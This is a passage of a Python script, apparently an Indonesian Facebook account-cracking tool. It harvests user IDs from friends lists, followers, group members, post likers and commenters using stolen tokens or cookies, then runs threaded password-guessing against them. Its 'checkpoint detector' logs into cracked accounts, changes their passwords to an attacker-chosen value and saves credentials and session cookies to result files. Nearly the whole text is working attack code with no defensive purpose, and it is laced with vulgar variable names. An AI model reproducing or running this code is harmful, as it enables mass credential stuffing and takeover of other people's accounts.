            os.system('xdg-open https:/?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);cek_pw()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
            print(' %s[%s!%s] You must have a %susername & password%s to\n continue with this tool!'%(N,M,N,H,N))
        else:
            exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
        #print(" %s[%s!%s] You must have a %susername & password%s to continue with this tool!"%(N,M,N,K,N))
        pw = input("\n %s[%s?%s] Enter Username : %s"%(N,K,N,H))
        loading()
        if pw in [""]:
            jalan(" %s[%s!%s] Sorry don't be blank!"%(N,M,N));time.sleep(1);cek_pw()
        elif pw in user:
            jalan(" %s[%s✓%s] OK Username is correct"%(N,H,N));time.sleep(1);kska()
        else:
            jalan(" %s[%s!%s] Sorry, wrong username"%(N,M,N));time.sleep(1);cek_pw()
    moch_yayan()
def kska():
    xx = input("\n %s[%s?%s] Enter Password : %s"%(N,K,N,H))
    loading()
    if xx in[""]:
        jalan(" %s[%s!%s] Sorry don't be blank!"%(N,M,N));time.sleep(1);cek_pw()
    elif xx in pwas:
        jalan(" %s[%s✓%s] OK Password is correct"%(N,H,N));time.sleep(2);open(".ini_pw.txt", "a").write(xx);moch_yayan()
    else:
        jalan(" %s[%s!%s] Sorry, wrong Password"%(N,M,N));time.sleep(1);cek_pw()

#METODE LOGIN

def yayanxd():
    os.system('clear')
    logo()
    r=requests.Session()
    print(' %s%sChoose your login method%s'%(BM,P,N))
    print(' [%s1%s] Login with EAAB Token (%sOFF%s)'%(H,O,H,O))
    print(' [%s2%s] Login with Cookies (%sON%s)'%(H,O,H,O))
    print(' [%s3%s] Login with ID & Password (%sOFF%s)'%(H,O,H,O))
    print(' [%s4%s] Convert Cookies to EAAB Token (%sON%s)'%(H,O,H,O))
    print(' [%s5%s] Send a message to the Author (%sChat%s)'%(H,O,H,O))
    p = input(f"\n [{K}?{N}] Choose Login Method : ")
    if p =="":
        print(f"\n {N}[{M}!{N}] Dont be empty");time.sleep(3);yayanxd()
    elif p in["1","01"]:
        login_token()
    elif p in["2","02"]:
        login_cookie()
    elif p in["3","03"]:
        login_passwod()
    elif p in["4","04"]:
        convert_cookietotoken()
    elif p in["5","05"]:
        infoauthor()
    else:
        jalan(f"\n {N}[{M}!{N}] Sorry, it is wrong");time.sleep(2);yayanxd()
###### INFO UPDATE & UPGRADE SC #####

### MENU UTAMA ###
def mochko():    
    os.system('clear')
    logo()
    token = open('.token.txt','r').read()
    cookie=open('.cookie.txt','r').read()
	#birth = tglx+' '+blnx+' '+thnx
	#except:birth = '-'
	#clear()
	#print(x+'\n['+h+'•'+x+'] USER ID     : '+str(my_id))
	#print(x+'['+h+'•'+x+'] IP ADDRESS  : '+str(sh['origin']))
   
    print("%s══════════════════════════════════════════"%(N))
    print(f" {BM}OPTION MENU{N}")
    print(' [%s01%s] Public Friends (%sON%s)'%(O,N,O,N));time.sleep(0.03)
    print(' [%s02%s] Public Followers (%sON%s)'%(O,N,O,N));time.sleep(0.03)
    print(' [%s03%s] Public Group Member (%sON%s)'%(O,N,O,N));time.sleep(0.03)
    print(' [%s04%s] Like Posts (%sON%s)'%(O,N,O,N));time.sleep(0.03)
    print(' [%s05%s] Comment Posts (%sON%s)'%(O,N,O,N));time.sleep(0.03)
    print(' [%s06%s] Checkpoint Detedtor (%sON%s)'%(O,N,O,N));time.sleep(0.03)
    print(' [%s07%s] Check Crack Results (%sON%s)'%(O,N,O,N));time.sleep(0.03)
    print(' [%s08%s] SC update info'%(O,N));time.sleep(0.03)
    print(' [%s00%s] Logout (%sRemove Token/Cookie%s)'%(M,N,M,N));time.sleep(0.03)
    pepek = input('\n %s[%s?%s] Select menu : '%(N,K,N))
    if pepek == '':
        jalan('\n %s[%s×%s] Sorry the menu selection is wrong...!'%(N,M,N));time.sleep(2);login()
###### CRACK ID PUBLIK SINGEL #####
    elif pepek in['1','01']:
        try:
        	token = open('.token.txt','r').read
        except IOError:
        	exit()     	
        try:                   
        
      
      
      
      
#print("%s══════════════════════════════════════════\n %sTARGET INFO%s"%(N,BM,N))    
            print(" %s[%s•%s] Type %sME%s crack from friends list"%(N,H,N,H,N))
            tar = input(' %s[%s?%s] Enter ID/Uname : %s'%(N,K,N,H));_memek_ = __convert__(user)
            #except AttributeError:exit(f" {N}[{M}×{N}] Incorrect username or ID")
            coki = {'cookie':cookie}
            t = tokenku[0]
            c = cokbrut[0]
            koh2 = requests.get('https://graph.facebook.com/v1.0/'+tar+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
            
    #
    
                    
            #print(f'>> Nama Target : {nam}')
            #koh2= requests.get(f'https://graph.facebook.com/{tar}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json()
            
            #r = requests.get(f"https://graph.facebook.com/{_memek_.get('_kontol_')}?fields=friends.limit(5000)&access_token={tokenz}")son()["friends"]
            
            for x in koh2["friends"]["data"]:
                try:id.append(x['id'] + '<=>' + x['name'])
               
                except:continue
               # print("kontol")
        except (KeyError,IOError):
            jalan(f' %s[%s×%s] Sorry %sID is not public/Invalid token%s'%(N,M,N,M,N));time.sleep(1);login()
###### CRACK RANDOM ID MASSAL #####
    elif pepek in['2','02']:
        #_ngocok_(token)
        followers()
###### CRACK GRUP #####
    elif pepek in['3','03']:
            print("%s══════════════════════════════════════════\n %sGROUP TARGET INFO%s"%(N,BM,N))
            kontol = input(f" {N}[{K}?{N}] Enter Group ID : {H}")
            if kontol in[""," "]:
                print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
            else:
                try:
                	#tokenz = open('.token.txt','r').read()
                    cookiz = open('.cookie.txt').read()
                    kueh  = {"cookie":cookiz}
                except IOError:
                    jalan(f"\n [{M}×{N}] You login using a token, if you want to crack from a group member, please login cookies first")
                    
                try:
                	tokenz = open('.token.txt','r').read()
                except IOError:
                	print('konrol')
                
                try:
                	#tokenz = open('.token.txt','r').read()
                    a = requests.get(f"https://graph.facebook.com/group/?id={kontol}&access_token={tokenz}").json()["name"]
                    if "Halaman Tidak Ditemukan" in a:
                        print(f"\n %s[%s×%s] Group with ID {kontol} not found"%(N,M,N))
                    elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in a:
                        print("\n %s[%s×%s] Facebook restricts every activity, account is spammed, please switch accounts"%(N,M,N))
                    elif "Konten Tidak Ditemukan" in a:
                        print(f"\n %s[%s×%s] Group with ID {kontol} not found"%(N,M,N))
                    else:                    
                        print(f" {N}[{H}•{N}] Group Name : {H}{a}")
                        print(f"\n {N}[{M}!{N}] To stop {H}CTRL+c{N} on keyboard")
                        crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}", kueh)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("\n [!] Sorry no connection")                                   
###### CRACK LIKE POSTINGAN #####
    elif pepek in['4','04']:
            print("%s══════════════════════════════════════════\n %sLIKE TARGET INFO%s"%(N,BM,N))
            kontol = input(f" {N}[{K}?{N}] Enter Post ID : {H}")
            if kontol in[""," "]:
                print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
            try:
                cookiz = open('.cokie.txt').read()
                kueh  = {"cookie":cookiz}
            except IOError:
                jalan(f"\n {N}[{M}×{N}] You login using a token, if you want to crack from a group member, please login cookies first");time.sleep(5);os.system('rm -rf .token.txt');yayanxd()
            try:
                print(f"\n {N}[{M}!{N}] To stop {H}CTRL+c{N} on keyboard")
                like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}", kueh)
            except KeyError:
                print(f"\n [!] Post with ID {kontol} not found");time.sleep(2);moch_yayan()
###### CRACK KOMENTAR #####
    elif pepek in['5','05']:
            print("%s══════════════════════════════════════════\n %sCOMMENT TARGET INFO%s"%(N,BM,N))
            kontol = input(f"\n {N}[{K}?{N}] Enter Post ID : {O}")
            if kontol in[""," "]:
                print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
            try:
                cookiz = open('.cokie.txt').read()
                kueh  = {"cookie":cookiz}
            except IOError:
                jalan(f"\n {N}[{M}×{N}] You login using a token, if you want to crack from a group member, please login cookies first");time.sleep(5);os.system('rm -rf .token.txt');yayanxd()
            try:
                print(f"\n {N}[{M}!{N}] To stop {H}CTRL+c{N} on keyboard")
                ngomen_post(f"https://mbasic.facebook.com/{kontol}", kueh)
            except KeyError:
                print(f"\n [!] Post with ID {kontol} not found");time.sleep(2);moch_yayan()
###### CHECKPOINT DETEDTOR #####
    elif pepek in['6','06']:
        gabut()
###### CEK HASIL CRACK #####
    elif pepek in['7','07']:
        dirs = os.listdir("results")
        print('%s══════════════════════════════════════════\n %sFILE HASIL CRACK%s'%(N,BM,N))
        for file in dirs:
            print(" %s[%s+%s] %s"%(N,H,N,file))
        file = input("\n %s%sFILE DETAILS%s\n [%s?%s] File name : %s"%(BM,P,N,K,N,H))
        if file == "":
            file = input("\n %s%sFILE DETAILS%s\n [%s?%s] File name :%s"%(BM,P,N,K,N,H))
        total = open("results/%s"%(file)).read().splitlines()
        #print("%s══════════════════════════════════════════"%(N));time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan(" %s[%s•%s] File date :%s%s\n %s[%s•%s] Total : %s%s%s"%(N,H,N,H,hps_nm,N,H,N,H,len(total),N))
        print("%s══════════════════════════════════════════"%(N));time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[Alien-OK] ","\x1b[1;92m[Alien-OK] ").replace("[Alien-CP] ", "\x1b[1;93m[Alien-CP] ")
            print("%s%s"%(titid,N));time.sleep(0.03)
        jalan("\n %s[%s✓%s] File check complete..."%(N,H,N))
        input(' [%sPRESS ENTER%s] to continue'%(H,N));login()
###### INFO UPDATE & UPGRADE SC #####
    elif pepek in['8','08']:
        print("%s══════════════════════════════════════════"%(N))
        jalan(f" {BM}{P}SC INFO{N}\n [{O}•{N}] Author SC : {K}Alienrazor")
   #     if upd =="":
        #    exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
    #    elif upd in["Y","y"]:
      #      jalan("\n %s[%s•%s] %sYou will be redirected to the Author Whatsapp..."%(N,H,N,H));time.sleep(0.02)
     #       os.system('xdg-open https');time.sleep(2);exit()
     #   elif upd in["T","t"]:
        jalan(f"\n {N}[{O}•{N}] Ok, thank you...")
        jalan(' %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
            #a = input('[••] Tekan Enter');login
    #    else:
        exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
###### HAPUS COOKIE #####
    elif pepek in['0','00']:
        print("")
        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r %s[%s!%s] Deleting Token/Cookie %s'%(N,M,N,x)); sys.stdout.flush()
            #time.sleep()
        os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
        jalan('\n %s[%s✓%s] %sSuccessfully delete Token/Cookie...'%(N,H,N,H))
        jalan('\n %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
       # a = input('[••] Tekan Enter');login
    else:
        jalan('\n %s[%s×%s] Sorry menu [%s%s%s] moderate improvement...!'%(N,M,N,M,pepek,N));time.sleep(2);login()
    return __crack__().plerr(id)
###### CRACK ID RANDOM MASSAL #####
def _ngocok_(__ppk__):
    try:
        print("%s══════════════════════════════════════════\n %sTARGET INFO%s"%(N,BM,N))
        nanya_keun = int(input(f' %s[%s?%s] Enter the target amount : %s'%(N,K,N,H)))
    except:nanya_keun=1
    print(f" %s[%s•%s] type %sme%s Crack from friends list"%(N,H,N,H,N))
    for mnh in range(nanya_keun):
        mnh +=1
        try:user = input(f' %s[%s?%s] Enter ID/Uname %s%s%s : %s'%(N,K,N,H,mnh,N,H));_memek_ = __convert__(user)
        except AttributeError:print(f" {N}[{M}×{N}] Username or ID is not public");continue
        try:
            col = requests.get('https://graph.facebook.com/v2.0/'+user+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cokbrut[0]}).json()["friends"]
            #zzz = requests.get(f"https://graph.facebook.com/v2.0/{_memek_.get('_kontol_')}?fields=friends.limit(5000)&access_token={__ppk__}").json()["friends"]
            for x in col["data"]:
                id.append(x["id"]+"<=>"+x["name"]+"\n")
        except (KeyError,IOError):
            jalan(f' %s[%s×%s] Sorry %sFriends ID is not public%s'%(N,M,N,M,N));continue
###### CRACK ANGGOTA GRUP PUBLIK #####
def crack_grup(url_group,kueh):
    try:
        sop_dev = BeautifulSoup(requests.get(url_group, cookies=kueh).content, "html.parser")
        members = sop_dev.find("div", id="objects_container")
        for dev in members.find_all("table"):
            user_ = dev["id"].replace("member_", "")
            nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
            try:id.append(f"{str(user_)}<=>{str(nama_)}\n")
            except:pass
            sys.stdout.write(f"\r {N}[{O}•{N}] Process Dump ID : {O}{len(id)}");sys.stdout.flush()
        if "Lihat Selengkapnya" in str(sop_dev):
            url = sop_dev.find("a", string="Lihat Selengkapnya")["href"]
            url_grup = "https://mbasic.facebook.com"+url
            crack_grup(url_group,kueh)
    except:pass
    #_i_.__crack__().plerr(id)
###### CRACK LIKE POSTINGAN #####
def like_post(hencet, mmk):
    try:
        kontol=requests.get(hencet,cookies=mmk).text
        if "Semua 0" in kontol:
            exit(" [!] There are no responses to this post")
        else:
            memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
                else:
                    id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write(f"\r {N}[{O}•{N}] Process Dump ID : {O}{len(id)}");sys.stdout.flush()
            if "Lihat Selengkapnya" in kontol:
                like_post("https://mbasic.facebook.com"+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"), mmk)
    except:pass
    #_i_.__crack__().plerr(id)
###### CRACK KOMENTAR #####
def ngomen_post(hencet, token):
    try:
        kontol= requests.get(hencet,cookies=token,headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}).text.encode("utf-8")
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('h3'):
            for _id_ in mmk.find_all('a',href=True):
                if "profile.php" in _id_.get("href"):
                    xz = _id_.get("href").split('=')[1]
                    bb = xz.split('&')[0]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                else:
                    xz = _id_.get("href").split('?')[0]
                    bb = xz.split('/')[1]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                sys.stdout.write(f"\r {N}[{O}•{N}] Process Dump ID : {O}{len(id)}");sys.stdout.flush()
        for asu in memek.find_all("a",href=True):
            if "Lihat komentar lainnyaâ€¦" in asu.text:
                ngomen_post("https://mbasic.facebook.com/"+asu.get("href"), token)
    except:pass
    #_i_.__crack__().plerr(id)
# USERNAME CONVERT TO ID
def __convert__(mmk):
    if "me" in mmk:
        return {"_kontol_":mmk}
    elif(re.findall("\w+",mmk)):
        r = requests.get(f"https://mbasic.facebook.com/{mmk}?_rdr").text
        try:
            user = re.findall('\;rid\=(\d+)\&',str(r))[0]
        except:
            user = mmk
    return {"_kontol_":user}
# CHEKER AKUN CHECKPOINT
def gabut():
    dirs = os.listdir("results")
    print('%s══════════════════════════════════════════\n %sFILE RESULT CRACK%s'%(N,BM,N))
    for file in dirs:
        print(" [%s+%s] %s"%(H,N,file))
    files = input("\n %s[%s?%s] Enter file : %s"%(N,K,N,H))
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        print('\n [!] Sorry, the file doesnt exist');time.sleep(2);moch_yayan()
    ww=input(f"{N}══════════════════════════════════════════\n [{M}!{N}] Play airplanemode first.\n══════════════════════════════════════════\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: {K}")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f"\n {N}[{O}•{N}] Password example : {O}admin123{N}")
        pwBar=input(f" [{K}?{N}] Enter new password : {K}")
        if len(pwBar) <= 5:
             print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
        else:
            pwBaru.append(pwBar)
    print(f' %s[%s•%s] Total %s%s%s account'%(N,H,N,H,str(len(buka_baju)),N))
    print("%s══════════════════════════════════════════"%(N))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split(' • ')
        print(f'{N}══════════════════════════════════════════\n {O}LOGIN PROCESS')
        jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[Alien-CP] ", "")}{N}')
        try:
            log_hasil(titid[0].replace("[Alien-CP] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
            print("")
    print("")
    jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
    jalan(' %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
   # a = input('[••] Tekan Enter');login
# CHEKPOINT DETEDTOR
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    uas_cekdetekdor = "Mozilla/5.0 (Linux; Android 12; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_EN;FBAV/239.0.0.10.109;]"
    session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":bahasa,"referer":"https://mbasic.facebook.com/","user-agent":uas_cekdetekdor})
    soup=BeautifulSoup(session.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Turn on airplanemode 2 seconds'%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r {N}[{M}×{N}] Account locked")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f"[✓] {user} • {pasw}\n")
            jalan(f"\r {N}[{H}✓{N}] {H}Account unlocked{N}");time.sleep(0.03)
            #cek_apk(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
               if "y" in ubahP:
                    mmk = pwBaru
                    jalan(f"\r [{H}•{N}] Status : {BM}{P}TAP YES{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
               else:
                    mmk = "Katasandi09"                                                    
                    jalan(f"\r [{H}•{N}] Status : {BM}{P}TAP YES{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(' [%s!%s] Sorry, the account is installed A2F'%(M,N))
            else:
                open('results/ERROR.txt', 'a').write(f"[Alien-CP] {user} • {pasw}\n")
                print(f" {N}[{M}!{N}] Error / Terpasang a2f")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f"[Alien-CP] {user} • {pasw}\n")
            print(" %s[%s•%s] There are %s options "%(N,H,N,len(cek)))
        for opt in range(len(cek)):
            print(f" \x1b[0m[{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r {N}[{M}!{N}] Password is wrong or has been changed")
        open('results/INVALID-OK.txt', 'a').write(f"[Alien-CP] {user} • {pasw}\n")
#UBAH PW
def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r {N}[{H}TAP-YES{N}] {H}{user} • {''.join(mmk)}{N}")
        print(f"\r {A}Cookie : {coki}{N}")
        open('results/TAB-YES.txt', 'a').write(f"[TAP-YES] {user} • {''.join(mmk)}\n")
        #cek_apk(session,coki)
# CEK APLIKASI YANG TERKAIT
'''
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
'''
# MULAI CRACK
def followers():
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        exit()
        

    
    mmk = input ('\n[?] Masukkan ID Facebook : ');_memek_ = __convert__(user)
    try:
        koh2 = requests.get('https://graph.facebook.com/' + mmk + '?fields=subscribers.limit(5000)&access_token=' + tokenku[0],cookies={'cookie': cokbrut[0]}).json()
        for pi in koh2['subscribers']['data']:
            try:id.append(pi['id'] + '<=>' + pi['name'])
            
            #try:
                #id.append(pi['id'] + '|' + pi['name'])
            except:
                continue

       # print('[*] Total : ' + str(len(id)))
        #setting()
    except requests.exceptions.ConnectionError:
        print('[!] Koneksi Internet Bermasalah') 
        exit()
    except (KeyError, IOError):
        print('[•] Followers Tidak Publik!!')
        exit()            
		     
class __crack__:

    def __init__(self):
        self.id = []
    # ------- NAMPILKAN APLIKASI --------
    def tampilkan_apk(self):
        print("%s════════════════════════════════════════\n [%s!%s] Displaying the application, the account will be easily hit by checkpoints due to using excessive request modules. It is not recommended to display the application"%(N,M,N))
        #crot = input(f" {N}[{K}?{N}] Enter SC Password : {H}")
        crot = input(f" {N}[{K}?{N}] Want to show related apps [{O}y{N}/{M}t{N}]: ")
        if crot in[""]:
            print(f" {N}[{M}×{N}] Don't be empty");self.tampilkan_apk()
        elif crot in["Y","y"]:
            Apk.append("y")
        elif crot in["T","t"]:
            Apk.append("t")
        else:
            #jalan(f" {N}[{M}×{N}] Sorry, wrong username");self.tampilkan_apk()
            print(f" {N}[{M}×{N}] Choose between y/t");self.tampilkan_apk()
# METODE SANDI MANUAL
    def plerr(self,id):
        self.id = id
        #print(f'>> Nama Target : {koh2}')
        time.sleep(3)
        print(f'\n %s[%s•%s] Total ID : %s%s%s' %(N,H,N,H,len(self.id),N))
        ___yayanganteng___ = input('%s══════════════════════════════════════════\n [%s?%s] Enter SC Password (%srequired%s) : %s'%(N,K,N,H,N,H))
        if ___yayanganteng___ in ('raraY', 'raray'):
            self.tampilkan_apk()
            print('%s══════════════════════════════════════════\n %sMANUAL PASSWORD DETAILS%s'%(N,BM,N))
            print(' %s[%s!%s] Use %sKOMMA%s for separator\n [%s•%s] Example : %sroy123%s,%ssayang%s,%sbismillah'%(N,M,N,H,N,H,N,H,N,H,N,H))
            while True:
                pwek = input(' %s[%s?%s] Enter password : %s'%(N,K,N,H))
                print(' %s[%s•%s] Active Password : %s%s%s' % (N,H,N,H, pwek, N))
                if pwek == '':
                    print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N))
                elif len(pwek)<=5:
                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = input('\n %s[%s?%s] Choose method : '%(N,K,N))
                        if cin == '':
                            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));__yan__()
                        elif cin == '1':
                            print('%s══════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
                            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
                            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '2':
                            print('%s══════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
                            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
                            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '3':
                            print('%s══════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
                            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
                            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        else:
                            print(' [%s×%s] Sorry, it is wrong...!'%(N,M,N));__yan__()
                    mentod()
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('', '  ', ' '):
            self.tampilkan_apk()
            mentod()
            self.__pler__()
        else:
            jalan(' %s[%s×%s] Sorry, wrong SC Password'%(N,M,N));self.plerr(id)
            #print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.plerr(id)
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;91m[?]","\x1b[1;92m[?]","\x1b[1;93m[?]","\x1b[1;94m[?]","\x1b[1;95m[?]","\x1b[1;96m[?]","\x1b[1;97m[?]"])
        sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:os.mkdir('results')
        except:pass
        try:
